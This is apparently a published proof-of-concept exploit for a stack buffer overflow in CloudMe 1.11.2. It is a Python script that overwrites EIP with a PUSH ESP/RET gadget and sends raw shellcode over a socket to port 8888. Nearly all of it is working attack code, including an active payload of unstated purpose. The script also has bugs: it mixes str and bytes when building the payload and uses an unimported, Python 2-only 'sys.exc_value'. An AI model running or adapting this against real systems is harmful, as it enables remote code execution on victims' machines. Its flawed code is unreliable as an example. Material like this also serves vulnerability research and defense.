# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
# payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
# payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
# payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
# payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
# payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
# payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
# payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
# payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
# payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
# payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
# payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
# payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
# payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
# payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
# payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
# payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
# payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

payload   = ""
payload   += b"\xda\xd8\xbd\x81\x2d\x7c\xae\xd9\x74\x24\xf4\x58"
payload   += b"\x2b\xc9\xb1\x3e\x31\x68\x18\x83\xc0\x04\x03\x68"
payload   += b"\x95\xcf\x89\x52\x7d\x8d\x72\xab\x7d\xf2\xfb\x4e"
payload   += b"\x4c\x32\x9f\x1b\xfe\x82\xeb\x4e\xf2\x69\xb9\x7a"
payload   += b"\x81\x1c\x16\x8c\x22\xaa\x40\xa3\xb3\x87\xb1\xa2"
payload   += b"\x37\xda\xe5\x04\x06\x15\xf8\x45\x4f\x48\xf1\x14"
payload   += b"\x18\x06\xa4\x88\x2d\x52\x75\x22\x7d\x72\xfd\xd7"
payload   += b"\x35\x75\x2c\x46\x4e\x2c\xee\x68\x83\x44\xa7\x72"
payload   += b"\xc0\x61\x71\x08\x32\x1d\x80\xd8\x0b\xde\x2f\x25"
payload   += b"\xa4\x2d\x31\x61\x02\xce\x44\x9b\x71\x73\x5f\x58"
payload   += b"\x08\xaf\xea\x7b\xaa\x24\x4c\xa0\x4b\xe8\x0b\x23"
payload   += b"\x47\x45\x5f\x6b\x4b\x58\x8c\x07\x77\xd1\x33\xc8"
payload   += b"\xfe\xa1\x17\xcc\x5b\x71\x39\x55\x01\xd4\x46\x85"
payload   += b"\xea\x89\xe2\xcd\x06\xdd\x9e\x8f\x4c\x20\x2c\xaa"
payload   += b"\x22\x22\x2e\xb5\x12\x4b\x1f\x3e\xfd\x0c\xa0\x95"
payload   += b"\xba\xe3\xea\xb4\xea\x6b\xb3\x2c\xaf\xf1\x44\x9b"
payload   += b"\xf3\x0f\xc7\x2e\x8b\xeb\xd7\x5a\x8e\xb0\x5f\xb6"
payload   += b"\xe2\xa9\x35\xb8\x51\xc9\x1f\xfb\x6f\x69\xd8\x9d"
payload   += b"\xe2\xe1\x68\x02\x94\x75\xed\xd5\x07\x05\xb1\x4e"
payload   += b"\xbe\x84\x15\xe4\x30\x3b\xc9\x67\xd4\x9f\x7b\x0b"
payload   += b"\x3a\x45\xfc\xae\x62\xa8\x99\x10\x01\xdf\x05\x7f"
payload   += b"\xa0\x67\xa3\x5f\x1b\xa8\x05\x91\x6b\xe6\x68\xe5"
payload   += b"\xa5\xc2\xaa\x3c\x8c\x18\x9c\x3e"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)